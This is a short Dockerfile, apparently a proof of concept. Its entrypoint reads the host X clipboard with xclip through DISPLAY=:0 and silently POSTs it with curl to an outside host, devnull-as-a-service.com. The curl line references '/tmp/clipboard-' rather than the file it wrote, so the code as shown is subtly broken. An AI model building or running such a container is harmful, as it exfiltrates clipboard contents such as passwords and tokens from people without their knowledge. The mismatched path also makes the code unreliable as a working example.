from fedora

RUN dnf install -y \
	xclip 


RUN useradd -m gridummyuser
ENV DISPLAY=:0

ENTRYPOINT /bin/bash -c "xclip -o > /tmp/clipboard; \
	cat /tmp/clipboard; \
	curl --silent -d @/tmp/clipboard- -X POST http://devnull-as-a-service.com/dev/null"

